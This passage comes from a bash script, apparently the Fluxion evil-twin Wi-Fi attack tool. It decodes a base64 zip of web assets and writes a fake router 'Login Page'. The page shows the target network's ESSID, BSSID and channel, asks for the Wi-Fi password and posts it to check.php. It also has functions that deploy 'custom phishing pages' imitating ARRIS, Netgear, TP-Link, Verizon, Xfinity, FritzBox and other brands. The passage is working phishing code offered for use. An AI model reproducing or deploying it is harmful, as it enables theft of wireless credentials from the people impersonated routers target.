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
0ArOJNIBUEsFBgAAAAAJAAkAhwMAAOfpAQAAAA==" | base64 -d > $DUMP_PATH/file.zip

	unzip $DUMP_PATH/file.zip -d $DUMP_PATH/data &>$flux_output_device
	rm $DUMP_PATH/file.zip &>$flux_output_device

	echo "<!DOCTYPE html>
	<html>
	<head>
	    <title>Login Page</title>
	    <meta charset=\"UTF-8\">
	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
		<!-- Styles -->
	    <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
		<!-- Scripts -->
		<script src=\"js/jquery-1.11.1.min.js\"></script>
		<script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
	</head>
	<body>
		<!-- final page -->
	    <div id=\"done\" data-role=\"page\" data-theme=\"a\">
			<div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
				<h3 style=\"text-align:center;\">$DIALOG_WEB_OK</h3>
			</div>
	    </div>
	</body>
</html>" > $DUMP_PATH/data/final.html

	echo "<!DOCTYPE html>
	<html>
	<head>
	    <title>Login Page</title>
	    <meta charset=\"UTF-8\">
	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
		<!-- Styles -->
	    <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
		<!-- Scripts -->
		<script src=\"js/jquery-1.11.1.min.js\"></script>
		<script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
		<script src=\"js/jquery.validate.min.js\"></script>
		<script src=\"js/additional-methods.min.js\"></script>
	</head>
	<body>
		<!-- Error page -->
	    <div data-role=\"page\" data-theme=\"a\">
			<div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
				<h3 style=\"text-align:center;\">$DIALOG_WEB_ERROR</h3>
				<a href=\"index.htm\" class=\"ui-btn ui-corner-all ui-shadow\" onclick=\"location.href='index.htm'\">$DIALOG_WEB_BACK</a>
			</div>
	    </div>
	</body>
</html>" > $DUMP_PATH/data/error.html

	echo "<!DOCTYPE html>
	<html>
	<head>
	    <title>Login Page</title>
	    <meta charset=\"UTF-8\">
	    <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
		<!-- Styles -->
	    <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
		<!-- Scripts -->
		<script src=\"js/jquery-1.11.1.min.js\"></script>
		<script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
		<script src=\"js/jquery.validate.min.js\"></script>
		<script src=\"js/additional-methods.min.js\"></script>
	</head>
	<body>
		<!-- Main page -->
	    <div data-role=\"page\" data-theme=\"a\">
			<div class=\"ui-content\" dir=\"$DIALOG_WEB_DIR\">
				<fieldset>
					<form id=\"loginForm\" class=\"ui-body ui-body-b ui-corner-all\" action=\"check.php\" method=\"POST\">
						</br>
						<div class=\"ui-field-contain ui-responsive\" style=\"text-align:center;\">
							<div>ESSID: <u>$Host_SSID</u></div>
							<div>BSSID: <u>$Host_MAC</u></div>
							<div>Channel: <u>$Host_CHAN</u></div>
						</div>
						<div style=\"text-align:center;\">
							<br><label>$DIALOG_WEB_INFO</label></br>
						</div>
						<div class=\"ui-field-contain\" >
							<label for=\"key1\">$DIALOG_WEB_INPUT</label>
							<input id=\"key1\" data-clear-btn=\"true\" type=\"password\" value=\"\" name=\"key1\" maxlength=\"64\"/>
						</div>

						<input data-icon=\"check\" data-inline=\"true\" name=\"submitBtn\" type=\"submit\" value=\"$DIALOG_WEB_SUBMIT\"/>
					</form>
				</fieldset>
			</div>
	    </div>
		<script src=\"js/main.js\"></script>
		<script>
    $.extend( $.validator.messages, {
        required: \"$DIALOG_WEB_ERROR_MSG\",
        maxlength: $.validator.format( \"$DIALOG_WEB_LENGTH_MAX\" ),
        minlength: $.validator.format( \"$DIALOG_WEB_LENGTH_MIN\" )});
  </script>
	</body>
</html>" > $DUMP_PATH/data/index.htm
}

# Functions to populate the content for the custom phishing pages
function ARRIS {
	mkdir $DUMP_PATH/data &>$flux_output_device
	cp $WORK_DIR/Sites/ARRIS-ENG/background.png $DUMP_PATH/data
	cp $WORK_DIR/Sites/ARRIS-ENG/house.png $DUMP_PATH/data
	cp $WORK_DIR/Sites/ARRIS-ENG/house1.png $DUMP_PATH/data
	cp $WORK_DIR/Sites/ARRIS-ENG/ayuda.htm $DUMP_PATH/data
	cp $WORK_DIR/Sites/ARRIS-ENG/error.html $DUMP_PATH/data
	cp $WORK_DIR/Sites/ARRIS-ENG/final.html $DUMP_PATH/data
	cp $WORK_DIR/Sites/ARRIS-ENG/index.htm $DUMP_PATH/data
}

function BELKIN {
	mkdir $DUMP_PATH/data &>$flux_output_device
	cp $WORK_DIR/Sites/BELKIN-ENG/info2.css $DUMP_PATH/data
	cp $WORK_DIR/Sites/BELKIN-ENG/info.css $DUMP_PATH/data
	cp $WORK_DIR/Sites/BELKIN-ENG/background.png $DUMP_PATH/data
	cp $WORK_DIR/Sites/BELKIN-ENG/house.png $DUMP_PATH/data
	cp $WORK_DIR/Sites/BELKIN-ENG/house1.png $DUMP_PATH/data
	cp $WORK_DIR/Sites/BELKIN-ENG/ayuda.htm $DUMP_PATH/data
	cp $WORK_DIR/Sites/BELKIN-ENG/error.html $DUMP_PATH/data
	cp $WORK_DIR/Sites/BELKIN-ENG/final.html $DUMP_PATH/data
	cp $WORK_DIR/Sites/BELKIN-ENG/info.html $DUMP_PATH/data
	cp $WORK_DIR/Sites/BELKIN-ENG/index.htm $DUMP_PATH/data
}

function NETGEAR {
	mkdir $DUMP_PATH/data &>$flux_output_device
	cp $WORK_DIR/Sites/NETGEAR-ENG/info2.css $DUMP_PATH/data
	cp $WORK_DIR/Sites/NETGEAR-ENG/info.css $DUMP_PATH/data
	cp $WORK_DIR/Sites/NETGEAR-ENG/background.png $DUMP_PATH/data
	cp $WORK_DIR/Sites/NETGEAR-ENG/house.png $DUMP_PATH/data
	cp $WORK_DIR/Sites/NETGEAR-ENG/house1.png $DUMP_PATH/data
	cp $WORK_DIR/Sites/NETGEAR-ENG/ayuda.htm $DUMP_PATH/data
	cp $WORK_DIR/Sites/NETGEAR-ENG/error.html $DUMP_PATH/data
	cp $WORK_DIR/Sites/NETGEAR-ENG/final.html $DUMP_PATH/data
	cp $WORK_DIR/Sites/NETGEAR-ENG/info.html $DUMP_PATH/data
	cp $WORK_DIR/Sites/NETGEAR-ENG/index.htm $DUMP_PATH/data
}

function ARRIS2 {
	mkdir $DUMP_PATH/data &>$flux_output_device
	cp $WORK_DIR/Sites/ARRIS-ESP/info2.css $DUMP_PATH/data
	cp $WORK_DIR/Sites/ARRIS-ESP/info.css $DUMP_PATH/data
	cp $WORK_DIR/Sites/ARRIS-ESP/background.png $DUMP_PATH/data
	cp $WORK_DIR/Sites/ARRIS-ESP/house.png $DUMP_PATH/data
	cp $WORK_DIR/Sites/ARRIS-ESP/house1.png $DUMP_PATH/data
	cp $WORK_DIR/Sites/ARRIS-ESP/ayuda.htm $DUMP_PATH/data
	cp $WORK_DIR/Sites/ARRIS-ESP/error.html $DUMP_PATH/data
	cp $WORK_DIR/Sites/ARRIS-ESP/final.html $DUMP_PATH/data
	cp $WORK_DIR/Sites/ARRIS-ESP/info.html $DUMP_PATH/data
	cp $WORK_DIR/Sites/ARRIS-ESP/index.htm $DUMP_PATH/data
}

function NETGEAR2 {
	mkdir $DUMP_PATH/data &>$flux_output_device
	cp $WORK_DIR/Sites/NETGEAR-ESP/info2.css $DUMP_PATH/data
	cp $WORK_DIR/Sites/NETGEAR-ESP/info.css $DUMP_PATH/data
	cp $WORK_DIR/Sites/NETGEAR-ESP/background.png $DUMP_PATH/data
	cp $WORK_DIR/Sites/NETGEAR-ESP/house.png $DUMP_PATH/data
	cp $WORK_DIR/Sites/NETGEAR-ESP/house1.png $DUMP_PATH/data
	cp $WORK_DIR/Sites/NETGEAR-ESP/ayuda.htm $DUMP_PATH/data
	cp $WORK_DIR/Sites/NETGEAR-ESP/error.html $DUMP_PATH/data
	cp $WORK_DIR/Sites/NETGEAR-ESP/final.html $DUMP_PATH/data
	cp $WORK_DIR/Sites/NETGEAR-ESP/info.html $DUMP_PATH/data
	cp $WORK_DIR/Sites/NETGEAR-ESP/index.htm $DUMP_PATH/data
}

function TPLINK {
	mkdir $DUMP_PATH/data &>$flux_output_device
        cp $WORK_DIR/Sites/Upgrade-TP-LINK/bootstrap.min.css $DUMP_PATH/data
        cp $WORK_DIR/Sites/Upgrade-TP-LINK/bootstrap.min.js $DUMP_PATH/data
        cp $WORK_DIR/Sites/Upgrade-TP-LINK/index.html $DUMP_PATH/data
        cp $WORK_DIR/Sites/Upgrade-TP-LINK/jquery.min.js $DUMP_PATH/data
        cp $WORK_DIR/Sites/Upgrade-TP-LINK/final.html $DUMP_PATH/data
        cp $WORK_DIR/Sites/Upgrade-TP-LINK/error.html $DUMP_PATH/data
}

function TPLINK_ITA {
mkdir $DUMP_PATH/data &>$flux_output_device
        cp $WORK_DIR/Sites/Upgrade-TP-LINK_ITA/bootstrap.min.css $DUMP_PATH/data
        cp $WORK_DIR/Sites/Upgrade-TP-LINK_ITA/bootstrap.min.js $DUMP_PATH/data
        cp $WORK_DIR/Sites/Upgrade-TP-LINK_ITA/index.html $DUMP_PATH/data
        cp $WORK_DIR/Sites/Upgrade-TP-LINK_ITA/jquery.min.js $DUMP_PATH/data
        cp $WORK_DIR/Sites/Upgrade-TP-LINK_ITA/final.html $DUMP_PATH/data
        cp $WORK_DIR/Sites/Upgrade-TP-LINK_ITA/error.html $DUMP_PATH/data
}

function VODAFONE {
	mkdir $DUMP_PATH/data &>$flux_output_device
	cp -r $WORK_DIR/Sites/ulh/index_files $DUMP_PATH/data
	cp $WORK_DIR/Sites/ulh/post.php $DUMP_PATH/data
	cp $WORK_DIR/Sites/ulh/password.txt $DUMP_PATH/data
	cp $WORK_DIR/Sites/ulh/index.html $DUMP_PATH/data
}

function VERIZON {
	mkdir $DUMP_PATH/data &>$flux_output_device
	cp -r $WORK_DIR/Sites/Login-Verizon/Verizon_files $DUMP_PATH/data
	cp $WORK_DIR/Sites/Login-Verizon/Verizon.html $DUMP_PATH/data
}

function XFINITY {
	mkdir $DUMP_PATH/data &>$flux_output_device
	cp -r $WORK_DIR/Sites/Login-Xfinity/Xfinity_files $DUMP_PATH/data
	cp $WORK_DIR/Sites/Login-Xfinity/Xfinity.html $DUMP_PATH/data
}

function HUAWEI {
	mkdir $DUMP_PATH/data &>$flux_output_device
	cp $WORK_DIR/Sites/HUAWEI-ENG/info2.css $DUMP_PATH/data
	cp $WORK_DIR/Sites/HUAWEI-ENG/info.css $DUMP_PATH/data
	cp $WORK_DIR/Sites/HUAWEI-ENG/background.png $DUMP_PATH/data
	cp $WORK_DIR/Sites/HUAWEI-ENG/house.png $DUMP_PATH/data
	cp $WORK_DIR/Sites/HUAWEI-ENG/house1.png $DUMP_PATH/data
	cp $WORK_DIR/Sites/HUAWEI-ENG/ayuda.htm $DUMP_PATH/data
	cp $WORK_DIR/Sites/HUAWEI-ENG/error.html $DUMP_PATH/data
	cp $WORK_DIR/Sites/HUAWEI-ENG/final.html $DUMP_PATH/data
	cp $WORK_DIR/Sites/HUAWEI-ENG/info.html $DUMP_PATH/data
	cp $WORK_DIR/Sites/HUAWEI-ENG/index.htm $DUMP_PATH/data
}

function ZIGGO_NL {
	mkdir $DUMP_PATH/data &>$flux_output_device
	cp $WORK_DIR/Sites/ZIGGO_NL/* $DUMP_PATH/data
	}

function KPN_NL {
	mkdir $DUMP_PATH/data &>$flux_output_device
	cp $WORK_DIR/Sites/KPN_NL/* $DUMP_PATH/data
	}

function ZIGGO2016_NL {
    mkdir $DUMP_PATH/data &>$flux_output_device
    cp $WORK_DIR/Sites/ZIGGO2016_NL/* $DUMP_PATH/data
}

function FRITZBOX_DE {
	mkdir $DUMP_PATH/data &>$flux_output_device
	cp $WORK_DIR/Sites/FRITZBOX_DE/* $DUMP_PATH/data
	}

function FRITZBOX_ENG {
	mkdir $DUMP_PATH/data &>$flux_output_device
	cp $WORK_DIR/Sites/FRITZBOX_ENG/* $DUMP_PATH/data
	}

function GENEXIS_DE {
	mkdir $DUMP_PATH/data &>$flux_output_device
	cp $WORK_DIR/Sites/GENEXIS_DE/* $DUMP_PATH/data
	}

function FREEBOX_2 {
mkdir $DUMP_PATH/data &>$flux_output_device
        cp $WORK_DIR/Sites/FREEBOX_2/index.htm $DUMP_PATH/data
	cp -R $WORK_DIR/Sites/FREEBOX_2/index_files $DUMP_PATH/data

}

######################################### < INTERFACE WEB > ########################################
top&& setresolution && setinterface
